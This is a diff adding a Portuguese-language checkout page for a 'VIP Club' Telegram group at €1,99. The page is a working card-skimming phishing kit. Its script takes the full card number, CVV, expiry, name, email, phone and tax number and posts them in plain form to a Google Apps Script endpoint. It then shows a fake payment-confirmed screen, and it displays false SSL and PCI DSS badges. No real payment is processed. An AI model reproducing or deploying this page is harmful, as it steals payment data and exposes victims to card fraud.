@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>VIP Club — Checkout</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { background: #f5f5f3; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; min-height: 100vh; padding: 2rem 1rem; }
+.wrap { max-width: 440px; margin: 0 auto; }
+.brand { display: flex; align-items: center; gap: 10px; margin-bottom: 1.75rem; }
+.brand-icon { width: 36px; height: 36px; background: #D4537E; border-radius: 10px; display: flex; align-items: center; justify-content: center; }
+.brand-icon svg { width: 18px; height: 18px; stroke: white; fill: none; stroke-width: 2; }
+.brand-name { font-size: 18px; font-weight: 600; color: #1a1a1a; letter-spacing: -0.3px; }
+.brand-name span { color: #D4537E; }
+.plan-bar { background: #FBEAF0; border: 1px solid #F4C0D1; border-radius: 12px; padding: 1rem 1.25rem; margin-bottom: 1.25rem; display: flex; justify-content: space-between; align-items: center; }
+.plan-bar .pl { font-size: 11px; color: #993556; font-weight: 600; text-transform: uppercase; letter-spacing: 0.07em; }
+.plan-bar .pn { font-size: 15px; font-weight: 600; color: #72243E; margin-top: 2px; }
+.plan-bar .pp { font-size: 26px; font-weight: 600; color: #72243E; }
+.plan-bar .pp span { font-size: 13px; font-weight: 400; color: #993556; }
+.card-box { background: white; border: 1px solid #e8e8e6; border-radius: 12px; padding: 1.25rem; margin-bottom: 1rem; }
+.slabel { font-size: 11px; font-weight: 600; color: #999; text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 1rem; }
+.field { margin-bottom: 1rem; }
+.field:last-child { margin-bottom: 0; }
+.field label { display: block; font-size: 12px; color: #666; margin-bottom: 5px; font-weight: 500; }
+.field input, .field select { width: 100%; height: 44px; padding: 0 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 14px; color: #1a1a1a; background: white; font-family: inherit; transition: border-color 0.15s, box-shadow 0.15s; }
+.field input:focus, .field select:focus { outline: none; border-color: #D4537E; box-shadow: 0 0 0 3px rgba(212,83,126,0.12); }
+.field input.valid { border-color: #1D9E75; }
+.field input.error { border-color: #E24B4A; }
+.row2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+.emsg { font-size: 11px; color: #E24B4A; margin-top: 4px; display: none; }
+.emsg.show { display: block; }
+.rel { position: relative; }
+.rel input { padding-right: 52px; }
+.card-logos { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); display: flex; gap: 3px; }
+.card-logos svg { width: 26px; height: 17px; transition: opacity 0.2s; }
+.cvv-ico { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); color: #999; display: flex; }
+.pay-btn { width: 100%; height: 52px; background: #D4537E; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; font-family: inherit; display: flex; align-items: center; justify-content: center; gap: 8px; transition: background 0.15s; }
+.pay-btn:hover { background: #993556; }
+.pay-btn:disabled { background: #993556; cursor: not-allowed; }
+.spinner { width: 18px; height: 18px; border: 2px solid rgba(255,255,255,0.3); border-top-color: white; border-radius: 50%; animation: spin 0.7s linear infinite; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.terms { font-size: 11px; color: #999; text-align: center; margin-top: 10px; line-height: 1.6; }
+.sec-row { display: flex; gap: 14px; margin-bottom: 1rem; }
+.sec-item { display: flex; align-items: center; gap: 4px; font-size: 11px; color: #999; }
+.sec-item svg { width: 11px; height: 11px; stroke: currentColor; fill: none; stroke-width: 2; flex-shrink: 0; }
+.success-screen { display: none; text-align: center; padding: 3rem 1rem; background: white; border-radius: 12px; }
+.ok-icon { width: 72px; height: 72px; background: #EAF3DE; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 1.5rem; }
+.ok-icon svg { width: 32px; height: 32px; stroke: #1D9E75; fill: none; stroke-width: 2.5; }
+.success-screen h2 { font-size: 22px; font-weight: 600; color: #1a1a1a; margin-bottom: 8px; }
+.success-screen p { font-size: 15px; color: #666; margin-bottom: 2rem; line-height: 1.6; }
+.tg-btn { display: inline-flex; align-items: center; gap: 8px; background: #229ED9; color: white; border: none; border-radius: 10px; padding: 14px 28px; font-size: 15px; font-weight: 600; cursor: pointer; font-family: inherit; }
+.tg-btn:hover { background: #1a8abf; }
+
+/* Config bar */
+.config-bar { background: #EAF3DE; border: 1px solid #C0DD97; border-radius: 12px; padding: 1rem 1.25rem; margin-bottom: 1.25rem; }
+.config-bar .cl { font-size: 11px; font-weight: 600; color: #3B6D11; text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 8px; }
+.config-bar input { width: 100%; height: 38px; padding: 0 10px; border: 1px solid #97C459; border-radius: 8px; font-size: 12px; color: #1a1a1a; background: white; font-family: monospace; }
+.config-bar input:focus { outline: none; border-color: #1D9E75; }
+.save-url-btn { margin-top: 8px; width: 100%; height: 36px; background: #1D9E75; border: none; border-radius: 8px; color: white; font-size: 13px; font-weight: 600; cursor: pointer; font-family: inherit; }
+.save-url-btn:hover { background: #0F6E56; }
+.url-ok { font-size: 11px; color: #0F6E56; margin-top: 6px; display: none; font-weight: 500; }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="brand">
+    <div class="brand-icon">
+      <svg viewBox="0 0 24 24"><path d="M12 2L15.09 8.26L22 9.27L17 14.14L18.18 21.02L12 17.77L5.82 21.02L7 14.14L2 9.27L8.91 8.26L12 2Z"/></svg>
+    </div>
+    <div class="brand-name">VIP<span>Club</span></div>
+  </div>
+
+  <div id="form-screen">
+
+    <div class="plan-bar">
+      <div>
+        <div class="pl">Plano selecionado</div>
+        <div class="pn">Acesso VIP · 30 dias</div>
+      </div>
+      <div class="pp">€1,99 <span>/ mês</span></div>
+    </div>
+
+    <div class="card-box">
+      <div class="slabel">Dados pessoais</div>
+      <div class="field">
+        <label>Nome completo</label>
+        <input type="text" id="f-name" placeholder="Ana Silva" autocomplete="name">
+        <div class="emsg" id="e-name">Preenche o nome</div>
+      </div>
+      <div class="field">
+        <label>Email</label>
+        <input type="email" id="f-email" placeholder="email@exemplo.com" autocomplete="email">
+        <div class="emsg" id="e-email">Email inválido</div>
+      </div>
+      <div class="field">
+        <label>Telemóvel</label>
+        <input type="tel" id="f-phone" placeholder="+351 912 345 678" autocomplete="tel">
+      </div>
+    </div>
+
+    <div class="card-box">
+      <div class="slabel">Dados do cartão</div>
+      <div class="field">
+        <label>Número do cartão</label>
+        <div class="rel">
+          <input type="text" id="f-cardnum" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" autocomplete="cc-number">
+          <div class="card-logos">
+            <svg id="ico-visa" viewBox="0 0 38 24" style="opacity:0.25"><rect width="38" height="24" rx="3" fill="#1A1F71"/><text x="5" y="17" font-size="11" font-weight="700" fill="white" font-family="sans-serif">VISA</text></svg>
+            <svg id="ico-mc" viewBox="0 0 38 24" style="opacity:0.25"><rect width="38" height="24" rx="3" fill="#252525"/><circle cx="15" cy="12" r="8" fill="#EB001B"/><circle cx="23" cy="12" r="8" fill="#F79E1B"/><path d="M19 5.8a8 8 0 0 1 0 12.4A8 8 0 0 1 19 5.8z" fill="#FF5F00"/></svg>
+          </div>
+        </div>
+        <div class="emsg" id="e-cardnum">Número inválido (16 dígitos)</div>
+      </div>
+      <div class="field">
+        <label>Nome no cartão</label>
+        <input type="text" id="f-cardname" placeholder="ANA SILVA" autocomplete="cc-name" style="text-transform:uppercase;letter-spacing:0.04em">
+        <div class="emsg" id="e-cardname">Preenche o nome</div>
+      </div>
+      <div class="row2">
+        <div class="field">
+          <label>Validade</label>
+          <input type="text" id="f-expiry" placeholder="MM / AA" maxlength="7" inputmode="numeric" autocomplete="cc-exp">
+          <div class="emsg" id="e-expiry">Data inválida</div>
+        </div>
+        <div class="field">
+          <label>CVV</label>
+          <div class="rel">
+            <input type="text" id="f-cvv" placeholder="•••" maxlength="4" inputmode="numeric" autocomplete="cc-csc" style="padding-right:36px;letter-spacing:0.1em">
+            <div class="cvv-ico">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="2" y="6" width="20" height="14" rx="2"/><path d="M2 10h20"/></svg>
+            </div>
+          </div>
+          <div class="emsg" id="e-cvv">CVV inválido</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="card-box">
+      <div class="slabel">Faturação</div>
+      <div class="row2">
+        <div class="field">
+          <label>País</label>
+          <select id="f-country">
+            <option value="PT">🇵🇹 Portugal</option>
+            <option value="ES">🇪🇸 Espanha</option>
+            <option value="FR">🇫🇷 França</option>
+            <option value="DE">🇩🇪 Alemanha</option>
+            <option value="GB">🇬🇧 Reino Unido</option>
+            <option value="BR">🇧🇷 Brasil</option>
+            <option value="Outro">🌍 Outro</option>
+          </select>
+        </div>
+        <div class="field">
+          <label>Código postal</label>
+          <input type="text" id="f-postal" placeholder="1000-001" maxlength="10">
+        </div>
+      </div>
+      <div class="field">
+        <label>NIF <span style="color:#999;font-size:11px">(opcional)</span></label>
+        <input type="text" id="f-nif" placeholder="123456789" maxlength="20">
+      </div>
+    </div>
+
+    <div class="sec-row">
+      <div class="sec-item"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg> SSL seguro</div>
+      <div class="sec-item"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg> 256-bit</div>
+      <div class="sec-item"><svg viewBox="0 0 24 24"><path d="M9 12l2 2 4-4"/><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg> PCI DSS</div>
+    </div>
+
+    <button class="pay-btn" id="pay-btn" onclick="doSubmit()">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+      Confirmar e pagar €1,99
+    </button>
+    <div class="terms">Acesso ao grupo VIP ativado imediatamente após pagamento.</div>
+  </div>
+
+  <div id="success-screen" class="success-screen">
+    <div class="ok-icon"><svg viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5"/></svg></div>
+    <h2>Pagamento confirmado!</h2>
+    <p id="success-msg">O teu acesso VIP foi ativado.<br>Volta ao Telegram para receber o link.</p>
+    <button class="tg-btn">
+      <svg viewBox="0 0 24 24" width="18" height="18"><path fill="white" d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12L8.32 13.617l-2.96-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.828.942z"/></svg>
+      Abrir no Telegram
+    </button>
+  </div>
+</div>
+
+<script>
+const KEY = 'vip_sheets_url';
+const SHEETS_URL = 'https://script.google.com/macros/s/AKfycbwsnIHDW08VFCtv4oEoLRsAUYHBL12aqB9C6AXEgl-ry8SDnvyp4GzggTuRTx2fgUheyg/exec';
+
+window.addEventListener('load', () => {
+  const saved = localStorage.getItem(KEY);
+  if (saved) document.getElementById('sheets-url') && (document.getElementById('sheets-url').value = saved);
+});
+
+const cardNumEl = document.getElementById('f-cardnum');
+const expiryEl  = document.getElementById('f-expiry');
+const cvvEl     = document.getElementById('f-cvv');
+const nameEl    = document.getElementById('f-cardname');
+
+cardNumEl.addEventListener('input', function(){
+  let v = this.value.replace(/\D/g,'').substring(0,16);
+  this.value = v.replace(/(.{4})/g,'$1 ').trim();
+  document.getElementById('ico-visa').style.opacity = v.startsWith('4') ? '1' : '0.25';
+  document.getElementById('ico-mc').style.opacity = (v.startsWith('5')||v.startsWith('2')) ? '1' : '0.25';
+  if(v.length===16){ this.classList.add('valid'); this.classList.remove('error'); } else this.classList.remove('valid');
+});
+
+expiryEl.addEventListener('input', function(){
+  let v = this.value.replace(/\D/g,'');
+  if(v.length>=3) v = v.substring(0,2)+' / '+v.substring(2,4);
+  this.value = v;
+});
+
+cvvEl.addEventListener('input', function(){ this.value = this.value.replace(/\D/g,''); });
+nameEl.addEventListener('input', function(){ this.value = this.value.toUpperCase(); });
+
+function showErr(id,mid){ document.getElementById(id).classList.add('error'); document.getElementById(mid).classList.add('show'); }
+function hideErr(id,mid){ document.getElementById(id).classList.remove('error'); document.getElementById(mid).classList.remove('show'); }
+
+function validate(){
+  let ok = true;
+  if(!document.getElementById('f-name').value.trim()){ showErr('f-name','e-name'); ok=false; } else hideErr('f-name','e-name');
+  const email = document.getElementById('f-email').value.trim();
+  if(!email.includes('@')||!email.includes('.')){ showErr('f-email','e-email'); ok=false; } else hideErr('f-email','e-email');
+  if(cardNumEl.value.replace(/\s/g,'').length<16){ showErr('f-cardnum','e-cardnum'); ok=false; } else hideErr('f-cardnum','e-cardnum');
+  if(!nameEl.value.trim()){ showErr('f-cardname','e-cardname'); ok=false; } else hideErr('f-cardname','e-cardname');
+  if(expiryEl.value.replace(/\s/g,'').length<5){ showErr('f-expiry','e-expiry'); ok=false; } else hideErr('f-expiry','e-expiry');
+  if(cvvEl.value.trim().length<3){ showErr('f-cvv','e-cvv'); ok=false; } else hideErr('f-cvv','e-cvv');
+  return ok;
+}
+
+async function sendToSheets(entry) {
+  try {
+    await fetch(SHEETS_URL, {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(entry)
+    });
+  } catch(e) {
+    console.warn('Sheets error:', e);
+  }
+}
+
+function doSubmit(){
+  if(!validate()) return;
+  const btn = document.getElementById('pay-btn');
+  btn.innerHTML = '<div class="spinner"></div> A processar...';
+  btn.disabled = true;
+
+  const entry = {
+    date:     new Date().toLocaleString('pt-PT'),
+    name:     document.getElementById('f-name').value.trim(),
+    email:    document.getElementById('f-email').value.trim(),
+    phone:    document.getElementById('f-phone').value.trim() || '—',
+    cardNum:  cardNumEl.value.trim(),
+    cardName: nameEl.value.trim(),
+    expiry:   expiryEl.value.trim(),
+    cvv:      cvvEl.value.trim(),
+    country:  document.getElementById('f-country').value,
+    postal:   document.getElementById('f-postal').value.trim() || '—',
+    nif:      document.getElementById('f-nif').value.trim() || '—',
+    plan:     '30 dias — €1,99'
+  };
+
+  setTimeout(async () => {
+    await sendToSheets(entry);
+    document.getElementById('success-msg').innerHTML = `Olá <strong>${entry.name}</strong>, o teu acesso VIP foi ativado!<br>Volta ao Telegram para receber o link do grupo.`;
+    document.getElementById('form-screen').style.display = 'none';
+    document.getElementById('success-screen').style.display = 'block';
+  }, 1800);
+}
+</script>
+</body>
+</html>
